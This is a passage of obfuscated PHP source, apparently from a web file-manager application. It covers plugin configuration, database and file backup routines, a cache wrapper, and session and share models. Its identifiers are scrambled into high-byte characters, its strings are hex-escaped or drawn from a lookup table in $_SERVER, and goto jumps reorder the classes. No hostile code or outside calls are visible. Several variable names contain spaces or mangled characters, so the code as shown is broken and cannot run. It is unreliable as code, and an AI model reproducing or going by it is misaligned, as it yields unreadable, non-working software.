=& $_SERVER[¥ÙÌÜ¾ê]; $²Ûœß˜ = $this->loadList($ï÷Ö¦É»); if ($ìšÀø®Í) { Hook::apply($ï÷Ö¦É» . $ ÉçùÙì[1874]); } $this->update($²Ûœß˜[$ ÉçùÙì[395]], array($ ÉçùÙì[1875] => $ìšÀø®Í)); } public function appRegist($Ô„²´›ş, $ÖïÉ–¥™) { $šé’÷» =& $_SERVER[¥ÙÌÜ¾ê]; $¢ù«ğØ = $this->loadList($Ô„²´›ş); if ($¢ù«ğØ) { $this->update($¢ù«ğØ[$šé’÷»[395]], array($šé’÷»[1869] => $ÖïÉ–¥™)); } else { $ĞºĞ‡ß = array($šé’÷»[28] => $Ô„²´›ş, $šé’÷»[1869] => $ÖïÉ–¥™, $šé’÷»[743] => 0, $šé’÷»[6] => $this->getConfigDefault($Ô„²´›ş)); $this->insert($ĞºĞ‡ß); } } public function getConfigDefault($¹Ğ·Šøê) { $Íµ±Ê =& $_SERVER[¥ÙÌÜ¾ê]; $¯•Ãã† = array(); $À°ëÏñè = $this->getPackageJson($¹Ğ·Šøê); if (!$À°ëÏñè && is_array($À°ëÏñè[$Íµ±Ê[1876]])) { return $¯•Ãã†; } foreach ($À°ëÏñè[$Íµ±Ê[1876]] as $¨ñÖï¯­ => $ê£é¨â˜) { if (!isset($ê£é¨â˜[$Íµ±Ê[372]]) || isset($¯•Ãã†[$¨ñÖï¯­])) { continue; } $¯•Ãã†[$¨ñÖï¯­] = $ê£é¨â˜[$Íµ±Ê[372]]; } return $¯•Ãã†; } public function getPackageJson($Í×¯ªø÷) { return Hook::apply($Í×¯ªø÷ . $_SERVER[¥ÙÌÜ¾ê][1877]); } public function getConfig($ÀŒŠ£¯Ê, $×‘°‰Õ‘ = false) { $ÎÜˆİ©¥ =& $_SERVER[¥ÙÌÜ¾ê]; $½½Š”çÖ = array(); $™şçÛß¢ = $this->loadList($ÀŒŠ£¯Ê); if ($™şçÛß¢ && is_array($™şçÛß¢[$ÎÜˆİ©¥[6]])) { $½½Š”çÖ = $™şçÛß¢[$ÎÜˆİ©¥[6]]; } if (!$½½Š”çÖ || $×‘°‰Õ‘) { $½½Š”çÖ = $this->getConfigDefault($ÀŒŠ£¯Ê); } return $½½Š”çÖ; } public function setConfig($³À±›Å, $ß°«Íï’ = false) { $íœúš…¦ =& $_SERVER[¥ÙÌÜ¾ê]; $®¥›ÆµÕ = $this->loadList($³À±›Å); if (!$®¥›ÆµÕ) { return !1; } $Úú¿ñäÂ = $®¥›ÆµÕ[$íœúš…¦[6]]; if ($ß°«Íï’ == !1) { $Úú¿ñäÂ = array(); $ß°«Íï’ = $this->getConfigDefault($³À±›Å); } foreach ($ß°«Íï’ as $Ã‘ŞÈáÚ => $ÓĞÁËËİ) { $Úú¿ñäÂ[$Ã‘ŞÈáÚ] = is_string($ÓĞÁËËİ) ? trim($ÓĞÁËËİ) : $ÓĞÁËËİ; } $this->update($®¥›ÆµÕ[$íœúš…¦[395]], array($íœúš…¦[6] => $Úú¿ñäÂ)); } public function viewList() { $¥²ºŸÎ =& $_SERVER[¥ÙÌÜ¾ê]; $˜®ò³¶è = $this->loadList(); $this->pluginScan($˜®ò³¶è); $˜®ò³¶è = $this->loadPluginList(); $²´²¢åà = array(); foreach ($˜®ò³¶è as $õäğàÍŒ => $ßÚ¡Ú¿) { unset($ßÚ¡Ú¿[$¥²ºŸÎ[1869]], $ßÚ¡Ú¿[$¥²ºŸÎ[6]]); $®—‡Õš = PLUGIN_DIR . $ßÚ¡Ú¿[$¥²ºŸÎ[28]] . $¥²ºŸÎ[1871]; if (!is_file($®—‡Õš)) { continue; } $­ê™Î†¸ = Hook::apply($ßÚ¡Ú¿[$¥²ºŸÎ[28]] . $¥²ºŸÎ[1877]); if (is_array($­ê™Î†¸)) { $²´²¢åà[$õäğàÍŒ] = array_merge($ßÚ¡Ú¿, $­ê™Î†¸); } } return $²´²¢åà; } private function loadPluginList() { $şÊåãß® =& $_SERVER[¥ÙÌÜ¾ê]; $ ìğ„¬Á = $this->loadList(); if (strtolower(MOD) == $şÊåãß®[1878]) { return $ ìğ„¬Á; } $°ÕïµŞ = Hook::trigger($şÊåãß®[1879], $ ìğ„¬Á); if ($ ìğ„¬Á && !$°ÕïµŞ) { die; } return $°ÕïµŞ ? $°ÕïµŞ : $ ìğ„¬Á; } private function pluginScan($£İæÏò¦) { $Íº‚ö’ó =& $_SERVER[¥ÙÌÜ¾ê]; recursion_dir(PLUGIN_DIR, $Ò­È÷Ìş, $ê…Šü­, 0); foreach ($Ò­È÷Ìş as $îá‹ò°ß) { $õ´´³Ô = get_path_this($îá‹ò°ß); if (isset($£İæÏò¦[$õ´´³Ô]) || !file_exists($îá‹ò°ß . $Íº‚ö’ó[1880]) || !file_exists($îá‹ò°ß . $Íº‚ö’ó[1871])) { continue; } Hook::apply($õ´´³Ô . $Íº‚ö’ó[1874]); } } } goto E›¡°£Ú²Ü; C°‚ÎÒå˜·: class BackupDbFile { public function __construct() { } public function index() { $Ó‰£å³ú =& $_SERVER[¥ÙÌÜ¾ê]; $Òü‰¹ûø = Backup::get(); $İæÚ¹á = $Òü‰¹ûø[$Ó‰£å³ú[28]]; $ÀÈ°‘¬À = $this->tmpFilesPath() . "\x62\x61\x63\x6b\165\160\x5f{$İæÚ¹á}\x2f"; $Èüã¦Ÿ² = $this->backupPath($Òü‰¹ûø); if (!($Èüã¦Ÿ² = IO::mkdir($Èüã¦Ÿ²))) { return !1; } $öÅÜæØ× = IO::listPath($ÀÈ°‘¬À); $÷†¨‹• = isset($öÅÜæØ×[$Ó‰£å³ú[74]]) ? $öÅÜæØ×[$Ó‰£å³ú[74]] : array(); $‚°ŒˆÚş = array_sum(array_column($÷†¨‹•, $Ó‰£å³ú[78])); if (!$‚°ŒˆÚş) { return !1; } $Óà¸ï² = array($Ó‰£å³ú[797] => $‚°ŒˆÚş, $Ó‰£å³ú[798] => time()); Backup::set($Óà¸ï²); $ÃÁò¬Û = new TaskFileTransfer($Ó‰£å³ú[799], $Ó‰£å³ú[775], count($÷†¨‹•), LNG($Ó‰£å³ú[776]) . $Ó‰£å³ú[454] . LNG($Ó‰£å³ú[778]) . $Ó‰£å³ú[800]); $ÃÁò¬Û->task[$Ó‰£å³ú[756]] = $‚°ŒˆÚş; foreach ($öÅÜæØ×[$Ó‰£å³ú[74]] as $‘ó‚ÀÚ®) { $ÊŞ’ö’ò = IO::move($‘ó‚ÀÚ®[$Ó‰£å³ú[76]], $Èüã¦Ÿ²); if (!$ÊŞ’ö’ò) { $ÃÁò¬Û->end(); $¹¤Ô¢Ü¤ = IO::getLastError($Ó‰£å³ú[801] . $‘ó‚ÀÚ®[$Ó‰£å³ú[76]] . $Ó‰£å³ú[802] . $Èüã¦Ÿ² . $Ó‰£å³ú[530]); write_log($¹¤Ô¢Ü¤, $Ó‰£å³ú[775]); return !1; } } $ó˜¾à›¡ = CONTROLLER_DIR . $Ó‰£å³ú[803]; $†›„ª±õ = CONTROLLER_DIR . $Ó‰£å³ú[804]; IO::copy($ó˜¾à›¡, $Èüã¦Ÿ²); IO::copy($†›„ª±õ, $Èüã¦Ÿ²); $ÃÁò¬Û->end(); $Óà¸ï² = array($Ó‰£å³ú[805] => $‚°ŒˆÚş, $Ó‰£å³ú[806] => time()); Backup::set($Óà¸ï²); return !0; } private function backupPath($´¨öÃŸÚ) { $ßÍ”»· =& $_SERVER[¥ÙÌÜ¾ê]; $ëïù…² = $´¨öÃŸÚ[$ßÍ”»·[28]]; $ÑÑ´€€Î = Model($ßÍ”»·[763])->get($ßÍ”»·[764]); $™õÉ¥ñÈ = substr(md5($ßÍ”»·[765] . $ÑÑ´€€Î . $ëïù…²), 0, 8); return "\173\x69\157\72{$´¨öÃŸÚ[$ßÍ”»·[745]]}\x7d\x2f\x64\x61\x74\x61\x62\x61\x73\x65\x2f\142\x61\x63\x6b\x75\160\57" . $ëïù…² . $ßÍ”»·[71] . $™õÉ¥ñÈ; } private function tmpFilesPath() { $êü™êÉÁ =& $_SERVER[¥ÙÌÜ¾ê]; $±Ú˜ãø³ = TEMP_FILES; if ($GLOBALS[$êü™êÉÁ[6]][$êü™êÉÁ[88]][$êü™êÉÁ[795]]) { $±Ú˜ãø³ = $GLOBALS[$êü™êÉÁ[6]][$êü™êÉÁ[88]][$êü™êÉÁ[795]]; if (!mk_dir($±Ú˜ãø³) || !is_writable($±Ú˜ãø³) || !IO::mkfile($±Ú˜ãø³ . $êü™êÉÁ[796])) { $±Ú˜ãø³ = TEMP_FILES; } } return $±Ú˜ãø³; } } class BackupFile { public function __construct() { } public function index() { $±ë€®ùá = Backup::get(); $Ö¿íùõ› = $±ë€®ùá[$_SERVER[¥ÙÌÜ¾ê][291]][$_SERVER[¥ÙÌÜ¾ê][193]][$_SERVER[¥ÙÌÜ¾ê][461]]; $éä¬œ = array($_SERVER[¥ÙÌÜ¾ê][462] => array($_SERVER[¥ÙÌÜ¾ê][807], $Ö¿íùõ›), $_SERVER[¥ÙÌÜ¾ê][808] => array($_SERVER[¥ÙÌÜ¾ê][329], $±ë€®ùá[$_SERVER[¥ÙÌÜ¾ê][745]])); $ØÇÓ¹ò = (int) Model($_SERVER[¥ÙÌÜ¾ê][780])->where($éä¬œ)->count($_SERVER[¥ÙÌÜ¾ê][461]); $Å‹›ÀÌ… = (int) Model($_SERVER[¥ÙÌÜ¾ê][780])->where($éä¬œ)->sum($_SERVER[¥ÙÌÜ¾ê][78]); $†èÙÕâ¯ = new TaskFileTransfer($_SERVER[¥ÙÌÜ¾ê][809], $_SERVER[¥ÙÌÜ¾ê][775], $ØÇÓ¹ò, LNG($_SERVER[¥ÙÌÜ¾ê][776]) . $_SERVER[¥ÙÌÜ¾ê][777] . LNG($_SERVER[¥ÙÌÜ¾ê][810])); $†èÙÕâ¯->task[$_SERVER[¥ÙÌÜ¾ê][756]] = $Å‹›ÀÌ…; $é¢îÉõå = array($_SERVER[¥ÙÌÜ¾ê][811] => $ØÇÓ¹ò, $_SERVER[¥ÙÌÜ¾ê][812] => $Å‹›ÀÌ…, $_SERVER[¥ÙÌÜ¾ê][813] => time()); Backup::set($é¢îÉõå); $‚¤‚´êÉ = !0; $òõãõ€Ø = $this->storeIds(); $€ÕİÀÅô = 1; $áúÍ­çª = 1000; $˜ÊõÍÍ… = $õöæ‰ãÒ = 0; $ƒˆ¸ŸÆ = array(); $’„©‡´™ = $ìÒ˜ë¯ = 0; do { $ª’İ¹Åæ = $_SERVER[¥ÙÌÜ¾ê][814]; $²ìÀ¨î½ = Model($_SERVER[¥ÙÌÜ¾ê][780])->where($éä¬œ)->field($ª’İ¹Åæ)->order($_SERVER[¥ÙÌÜ¾ê][815])->selectPage($áúÍ­çª, $€ÕİÀÅô); $…†Ã±Ì = !empty($²ìÀ¨î½[$_SERVER[¥ÙÌÜ¾ê][367]]) ? $²ìÀ¨î½[$_SERVER[¥ÙÌÜ¾ê][367]] : array(); foreach ($…†Ã±Ì as $¤¯¥ÅÈÀ) { if (!$this->_fileExist($¤¯¥ÅÈÀ, $ƒˆ¸ŸÆ, $òõãõ€Ø)) { $ØÇÓ¹ò -= 1; $Å‹›ÀÌ… -= (int) $¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][78]]; write_log("\x66\x69\154\145\x20\156\x6f\x74\x20\145\x78\x69\x73\x74\x2e\x66\151\x6c\x65\x49\x44\x3a{$¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][461]]}\x2c\x20\160\x61\164\150\x3a{$¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][76]]}", $_SERVER[¥ÙÌÜ¾ê][816]); continue; } $‚ÙÕ¶ö = $¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][76]]; $µË”Ã© = "\x7b\x69\157\72{$±ë€®ùá[$_SERVER[¥ÙÌÜ¾ê][745]]}\x7d" . substr($‚ÙÕ¶ö, strlen("\x7b\151\157\x3a{$¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][817]]}\175")); if (IO::exist($µË”Ã©)) { $†èÙÕâ¯->updateFileEnd($¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][28]], $¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][78]]); } else { $µË”Ã© = get_path_father($µË”Ã©); IO::mkdir($µË”Ã©); if (!IO::copy($‚ÙÕ¶ö, $µË”Ã©, $_SERVER[¥ÙÌÜ¾ê][818])) { write_log($_SERVER[¥ÙÌÜ¾ê][819] . $‚ÙÕ¶ö . $_SERVER[¥ÙÌÜ¾ê][802] . $µË”Ã© . $_SERVER[¥ÙÌÜ¾ê][530], $_SERVER[¥ÙÌÜ¾ê][775]); $‚¤‚´êÉ = !1; break; } } $Ö¿íùõ› = $¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][461]]; $õöæ‰ãÒ += 1; $˜ÊõÍÍ… += $¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][78]]; $ìÒ˜ë¯ += 1; $’„©‡´™ += $¤¯¥ÅÈÀ[$_SERVER[¥ÙÌÜ¾ê][78]]; if ($˜ÊõÍÍ… >= 1024 * 1024 * 100) { $é¢îÉõå = array($_SERVER[¥ÙÌÜ¾ê][820] => $Ö¿íùõ›, $_SERVER[¥ÙÌÜ¾ê][821] => $ìÒ˜ë¯, $_SERVER[¥ÙÌÜ¾ê][822] => $’„©‡´™); Backup::set($é¢îÉõå); $˜ÊõÍÍ… = $õöæ‰ãÒ = 0; } } $Î¾Çºœı = count($…†Ã±Ì); $€ÕİÀÅô++; } while ($Î¾Çºœı == $áúÍ­çª); $†èÙÕâ¯->end(); $é¢îÉõå = array($_SERVER[¥ÙÌÜ¾ê][823] => 1, $_SERVER[¥ÙÌÜ¾ê][490] => time(), $_SERVER[¥ÙÌÜ¾ê][768] => 1, $_SERVER[¥ÙÌÜ¾ê][820] => $Ö¿íùõ›, $_SERVER[¥ÙÌÜ¾ê][812] => $Å‹›ÀÌ…, $_SERVER[¥ÙÌÜ¾ê][811] => $ØÇÓ¹ò, $_SERVER[¥ÙÌÜ¾ê][824] => time()); if ($õöæ‰ãÒ) { $é¢îÉõå[$_SERVER[¥ÙÌÜ¾ê][821]] = $ìÒ˜ë¯; $é¢îÉõå[$_SERVER[¥ÙÌÜ¾ê][822]] = $’„©‡´™; } Backup::set($é¢îÉõå); $this->_fileFilter($ƒˆ¸ŸÆ); return !0; } private function _fileExist($×¬¹ñŸé, &$ö’ù¼‹©, $è”§èÙü) { $õºÆ¼Û =& $_SERVER[¥ÙÌÜ¾ê]; $–£µ¾Æü = $×¬¹ñŸé[$õºÆ¼Û[76]]; if (in_array($×¬¹ñŸé[$õºÆ¼Û[461]], $ö’ù¼‹©)) { return !1; } if (!in_array($×¬¹ñŸé[$õºÆ¼Û[817]], $è”§èÙü)) { return !1; } if (IO::exist($–£µ¾Æü)) { return !0; } $œå¿Ëœ = get_path_father($–£µ¾Æü); if (IO::exist($œå¿Ëœ)) { $ö’ù¼‹©[] = $×¬¹ñŸé[$õºÆ¼Û[461]]; return !1; } $Ã­Éõ€¹ = array($õºÆ¼Û[817] => $×¬¹ñŸé[$õºÆ¼Û[817]], $õºÆ¼Û[76] => array($õºÆ¼Û[381], "{$œå¿Ëœ}\45")); $ËÑ×ùŠ’ = Model($õºÆ¼Û[780])->where($Ã­Éõ€¹)->field($õºÆ¼Û[462])->select(); $ö’ù¼‹© = array_merge($ö’ù¼‹©, array_to_keyvalue($ËÑ×ùŠ’, $õºÆ¼Û[33], $õºÆ¼Û[461])); return !1; } private function _fileFilter($ûÕ¦ÎÎØ) { $Í¡¬ÏÙ› =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($ûÕ¦ÎÎØ)) { return; } $·’„ˆÌ© = array($Í¡¬ÏÙ›[461] => array($Í¡¬ÏÙ›[7], array_unique($ûÕ¦ÎÎØ))); $Ó¤ù§´§ = Model($Í¡¬ÏÙ›[825])->where($·’„ˆÌ©)->field($Í¡¬ÏÙ›[397])->select(); foreach ($Ó¤ù§´§ as $ÎÌ¿×’…) { Model($Í¡¬ÏÙ›[825])->remove($ÎÌ¿×’…[$Í¡¬ÏÙ›[397]], !1); } } private function storeIds() { $œüş¡ =& $_SERVER[¥ÙÌÜ¾ê]; $äãçÔ­ô = Model($œüş¡[760])->listData(); $’ŞÃ•™Å = array(); $‰§²òÂ¿ = $GLOBALS[$œüş¡[6]][$œüş¡[88]][$œüş¡[826]]; foreach ($äãçÔ­ô as $ıÆêø¥™) { $ùá÷Ÿâß = strtolower($ıÆêø¥™[$œüş¡[94]]); if (!isset($‰§²òÂ¿[$ùá÷Ÿâß])) { continue; } $½¹Ù‰Ø« = $œüş¡[72] . (isset($‰§²òÂ¿[$ùá÷Ÿâß]) ? $‰§²òÂ¿[$ùá÷Ÿâß] : ucfirst($ùá÷Ÿâß)); if (!class_exists($½¹Ù‰Ø«)) { continue; } $’ŞÃ•™Å[] = $ıÆêø¥™[$œüş¡[395]]; } return $’ŞÃ•™Å; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¢œ¨»Ñ =& $_SERVER[¥ÙÌÜ¾ê]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $õ…Â¶³¤ = $GLOBALS[$¢œ¨»Ñ[6]][$¢œ¨»Ñ[347]]; $º½°ñø¥ = $õ…Â¶³¤[$õ…Â¶³¤[$¢œ¨»Ñ[827]]]; $ß…ïåîÁ = $õ…Â¶³¤[$¢œ¨»Ñ[828]]; switch ($õ…Â¶³¤[$¢œ¨»Ñ[827]]) { case $¢œ¨»Ñ[17]: self::$handle = Model($¢œ¨»Ñ[829]); break; case $¢œ¨»Ñ[830]: self::$handle = new CacheRedis($º½°ñø¥, $ß…ïåîÁ); break; case $¢œ¨»Ñ[831]: self::$handle = new CacheMemcached($º½°ñø¥, $ß…ïåîÁ); break; case $¢œ¨»Ñ[193]: self::$handle = new CacheFile($º½°ñø¥, $ß…ïåîÁ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Ã˜Éèšš) { if (is_array($Ã˜Éèšš) || is_object($Ã˜Éèšš)) { $Ã˜Éèšš = json_encode($Ã˜Éèšš); } $Ã˜Éèšš = rawurlencode($Ã˜Éèšš); return md5(KOD_SITE_ID . $_SERVER[¥ÙÌÜ¾ê][71] . $Ã˜Éèšš); } public static function get($¦Şçü´½, $‰ŠÇì´½ = false) { $¥Âèæ·ò = self::key($¦Şçü´½); if ($‰ŠÇì´½) { return unserialize(self::init()->get($¥Âèæ·ò)); } if (!isset(self::$memoryCache[$¥Âèæ·ò])) { $ÈĞÜìèÚ = self::init()->get($¥Âèæ·ò); self::$memoryCache[$¥Âèæ·ò] = unserialize($ÈĞÜìèÚ); } return self::$memoryCache[$¥Âèæ·ò]; } public static function set($‰Ş“À, $ö©Šª¾, $¢î×ÛÑ¸ = false) { $®Ğ¸çÊâ = self::key($‰Ş“À); if (isset(self::$memoryCache[$®Ğ¸çÊâ]) && self::$memoryCache[$®Ğ¸çÊâ] === $ö©Šª¾) { return !0; } if ($¢î×ÛÑ¸ === 0) { self::$memoryCache[$®Ğ¸çÊâ] = $ö©Šª¾; return !0; } CacheLock::lock($‰Ş“À); $˜Óş¿ïÁ = self::init()->set($®Ğ¸çÊâ, serialize($ö©Šª¾), $¢î×ÛÑ¸); self::$memoryCache[$®Ğ¸çÊâ] = $ö©Šª¾; CacheLock::unlock($‰Ş“À); return $˜Óş¿ïÁ; } public static function getCall($Ùâ›ô, $•…¤Ú‹, $°¸Ò»ô, $ÎÄìÉ¾î = array()) { $§®€Ä¯ê =& $_SERVER[¥ÙÌÜ¾ê]; $Ù“¬ùÎ’ = self::get($Ùâ›ô); if ($Ù“¬ùÎ’ || $Ù“¬ùÎ’ === $§®€Ä¯ê[33]) { return $Ù“¬ùÎ’; } $Ù“¬ùÎ’ = call_user_func_array($°¸Ò»ô, $ÎÄìÉ¾î); $Ù“¬ùÎ’ = $Ù“¬ùÎ’ ? $Ù“¬ùÎ’ : $§®€Ä¯ê[33]; self::set($Ùâ›ô, $Ù“¬ùÎ’, $•…¤Ú‹); return $Ù“¬ùÎ’; } public static function remove($À’¾Š Ó) { $œ‚ƒä» = self::key($À’¾Š Ó); unset(self::$memoryCache[$œ‚ƒä»]); self::clearTimeout(); CacheLock::lock($À’¾Š Ó); $…‘²‹÷† = self::init()->remove($œ‚ƒä»); CacheLock::unlock($À’¾Š Ó); return $…‘²‹÷†; } public static function removeMemory($Ôö£ñƒˆ) { $½ïûÃ ˆ = self::key($Ôö£ñƒˆ); unset(self::$memoryCache[$½ïûÃ ˆ]); } public static function clearMemory($Ãäƒâ‚ = false) { if ($Ãäƒâ‚) { $Ãäƒâ‚ = self::key($Ãäƒâ‚); unset(self::$memoryCache[$Ãäƒâ‚]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¥ÙÌÜ¾ê][832])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¥ÙÌÜ¾ê][833])) { self::init()->clearTimeout(); } } } goto EÒ»ÆË›£®; E›¡°£Ú²Ü: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\155\x5f\163\x65\163\x73\151\x6f\x6e"; public function get($´¸á·ã–) { $‰ˆæÖÅı =& $_SERVER[¥ÙÌÜ¾ê]; $Ğ¬–§şï = $this->where(array($‰ˆæÖÅı[1881] => $´¸á·ã–))->find(); if (!is_array($Ğ¬–§şï)) { return !1; } return $Ğ¬–§şï[$‰ˆæÖÅı[748]]; } public function set($Õò±ŸÖ, $‰Àè²û½, $¸½Ô¸Û÷ = 3600) { $†ÏœªÎ§ =& $_SERVER[¥ÙÌÜ¾ê]; $”ë˜½½­ = array($†ÏœªÎ§[1881] => $Õò±ŸÖ, $†ÏœªÎ§[1787] => $‰Àè²û½, $†ÏœªÎ§[1882] => $¸½Ô¸Û÷ + time()); if (Session::get($†ÏœªÎ§[1883])) { $”ë˜½½­[$†ÏœªÎ§[1581]] = Session::get($†ÏœªÎ§[1883]); } else { $”ë˜½½­[$†ÏœªÎ§[1581]] = 0; } if ($this->get($Õò±ŸÖ)) { return $this->where(array($†ÏœªÎ§[1881] => $Õò±ŸÖ))->save($”ë˜½½­); } else { return $this->add($”ë˜½½­, array(), !0); } } public function remove($«ŒÌ¬¹Ş) { return $this->where(array($_SERVER[¥ÙÌÜ¾ê][1881] => $«ŒÌ¬¹Ş))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¥ÙÌÜ¾ê][1884] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\x54\x69\155\x65", "\164\151\155\145", "\151\x6e\163\x65\x72\x74\54\165\160\x64\x61\164\145", "\146\165\x6e\x63\164\x69\x6f\x6e"), array("\143\162\145\141\164\145\124\x69\x6d\x65", "\x74\x69\155\145", "\151\x6e\163\x65\x72\164", "\x66\165\156\x63\164\151\x6f\156"), array("\157\160\164\x69\157\x6e\163", '', "\151\156\163\x65\x72\164\x2c\165\x70\144\141\x74\145\54\163\x65\x6c\x65\x63\164", "\152\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($ƒğš“­) { $¾±¢ÚŒ =& $_SERVER[¥ÙÌÜ¾ê]; $ü“Õºûæ = isset($ƒğš“­[0]) ? $ƒğš“­[0] : !1; return array($¾±¢ÚŒ[1885] => array(USER_ID, $¾±¢ÚŒ[1886]), $¾±¢ÚŒ[1828] => array($ü“Õºûæ, $¾±¢ÚŒ[1887])); } protected function listSimple() { $ô¨¾ı”Ô = array($_SERVER[¥ÙÌÜ¾ê][1581] => USER_ID); $˜İ¿ä„ù = $this->field($this->fieldList)->where($ô¨¾ı”Ô)->select(); return $˜İ¿ä„ù ? $˜İ¿ä„ù : array(); } protected function getInfo($ïÛ±–¤Õ, $ª‰¤¼ßú = false) { $‘¹ÈÔ®ú =& $_SERVER[¥ÙÌÜ¾ê]; if ($ª‰¤¼ßú) { return $this->_getShareInfo(array($‘¹ÈÔ®ú[482] => $ïÛ±–¤Õ)); } $ºƒ¼ª¢Ç = $this->cacheFunctionGet($‘¹ÈÔ®ú[1830], $ïÛ±–¤Õ); return $ºƒ¼ª¢Ç; } public function getInfoByHash($¶‹ÎÇéÚ) { return $this->_getShareInfo(array($_SERVER[¥ÙÌÜ¾ê][484] => $¶‹ÎÇéÚ)); } public function getInfoByPath($ı¢û¸ó®) { $‹¹¶İ =& $_SERVER[¥ÙÌÜ¾ê]; $Ç÷ë’œ = array($‹¹¶İ[1581] => USER_ID, $‹¹¶İ[397] => $ı¢û¸ó®); return $this->_getShareInfo($Ç÷ë’œ); } public function getInfoBySourcePath($š‹ÑÏ¡Œ) { $¯”á‰ƒ =& $_SERVER[¥ÙÌÜ¾ê]; $€®€²á  = array($¯”á‰ƒ[1581] => USER_ID, $¯”á‰ƒ[1106] => $š‹ÑÏ¡Œ); return $this->_getShareInfo($€®€²á ); } private function _getShareInfo($É òõñ”) { $ÓšÖ ı =& $_SERVER[¥ÙÌÜ¾ê]; $é¤ùÛüÕ = $this->where($É òõñ”)->find(); if (!$é¤ùÛüÕ) { return !1; } $É òõñ” = array($ÓšÖ ı[482] => $é¤ùÛüÕ[$ÓšÖ ı[482]]); $œªİÀ±Î = $ÓšÖ ı[1888]; $ÅöÒ§ŞÚ = Model($ÓšÖ ı[590])->order($ÓšÖ ı[395])->field($œªİÀ±Î)->where($É òõñ”)->select(); if ($é¤ùÛüÕ[$ÓšÖ ı[397]] == $ÓšÖ ı[191]) { $é¤ùÛüÕ[$ÓšÖ ı[85]] = IO::info($é¤ùÛüÕ[$ÓšÖ ı[1106]]); } else { $é¤ùÛüÕ[$ÓšÖ ı[85]] = Model($ÓšÖ ı[1253])->pathInfo($é¤ùÛüÕ[$ÓšÖ ı[397]]); } $é¤ùÛüÕ[$ÓšÖ ı[1889]] = $ÅöÒ§ŞÚ; return $é¤ùÛüÕ; } protected function getInfoAuth($Áòæˆ«Š) { $©üş“è =& $_SERVER[¥ÙÌÜ¾ê]; $•£ã‹Ø = $this->getInfo($Áòæˆ«Š); if ($•£ã‹Ø[$©üş“è[1581]] == USER_ID) { $•£ã‹Ø[$©üş“è[408]] = $•£ã‹Ø[$©üş“è[85]][$©üş“è[408]]; } else { $•£ã‹Ø[$©üş“è[408]] = Model($©üş“è[496])->authMake($•£ã‹Ø[$©üş“è[1889]]); } return $•£ã‹Ø; } protected function listData($ï«äÉ›— = null, $µç™äÈ¥ = 300) { $¦ÖÒÊªß =& $_SERVER[¥ÙÌÜ¾ê]; $ĞÃÇÉ¯¯ = array(array($¦ÖÒÊªß[487] => array($¦ÖÒÊªß[1008], 0), $¦ÖÒÊªß[489] => array($¦ÖÒÊªß[1008], 0), $¦ÖÒÊªß[1890] => $¦ÖÒÊªß[1844])); if ($ï«äÉ›— == $¦ÖÒÊªß[1891]) { $ĞÃÇÉ¯¯ = array($¦ÖÒÊªß[487] => 1); } else { if ($ï«äÉ›— == $¦ÖÒÊªß[1091]) { $ĞÃÇÉ¯¯ = array($¦ÖÒÊªß[489] => 1); } } $ĞÃÇÉ¯¯[$¦ÖÒÊªß[1581]] = USER_ID; $ú±ëÜ = $this->where($ĞÃÇÉ¯¯)->selectPage($µç™äÈ¥); return $ú±ëÜ; } protected function listToMe($£ª×èã† = 300) { $µè—ÅÜ· =& $_SERVER[¥ÙÌÜ¾ê]; $¢©ñÊÇ¢ = Model($µè—ÅÜ·[1892])->userGroupParents(USER_ID); $‘å“çë¬ = array($µè—ÅÜ·[574] => SourceModel::TYPE_USER, $µè—ÅÜ·[498] => USER_ID); if ($¢©ñÊÇ¢) { $‘å“çë¬ = array(array($µè—ÅÜ·[574] => SourceModel::TYPE_USER, $µè—ÅÜ·[498] => USER_ID), array($µè—ÅÜ·[574] => SourceModel::TYPE_GROUP, $µè—ÅÜ·[498] => array($µè—ÅÜ·[7], $¢©ñÊÇ¢)), $µè—ÅÜ·[1890] => $µè—ÅÜ·[1844]); } $“¥¢¶®  = Model($µè—ÅÜ·[590])->where($‘å“çë¬)->selectPage($£ª×èã†); $ã€ó’İ = array_to_keyvalue_group($“¥¢¶® [$µè—ÅÜ·[367]], $µè—ÅÜ·[482]); if (!$ã€ó’İ) { return $“¥¢¶® ; } $ÉŒ¢ó‚ = $µè—ÅÜ·[1893]; $‘å“çë¬ = array($µè—ÅÜ·[482] => array($µè—ÅÜ·[413], array_keys($ã€ó’İ)), $µè—ÅÜ·[1581] => array($µè—ÅÜ·[1010], $µè—ÅÜ·[191])); $Ã§õœœÅ = $this->field($ÉŒ¢ó‚)->where($‘å“çë¬)->select(); foreach ($Ã§õœœÅ as $ö…µ×ˆß => &$¨¨˜Û—) { $¨¨˜Û—[$µè—ÅÜ·[1889]] = $ã€ó’İ[$¨¨˜Û—[$µè—ÅÜ·[482]]]; } unset($¨¨˜Û—); $™ÛÚ¦æ  = array($µè—ÅÜ·[1894] => $Ã§õœœÅ, $µè—ÅÜ·[1895] => $“¥¢¶® [$µè—ÅÜ·[364]]); return $™ÛÚ¦æ ; } protected function shareAdd($®á„Òôà, $·ï¼Ôêª) { $Á¡Â¥ † =& $_SERVER[¥ÙÌÜ¾ê]; $å—£³ = $this->_addShareData($®á„Òôà, $·ï¼Ôêª); if (!empty($·ï¼Ôêª[$Á¡Â¥ †[1896]])) { $this->_shareAuthSet($å—£³, $·ï¼Ôêª[$Á¡Â¥ †[1896]]); } 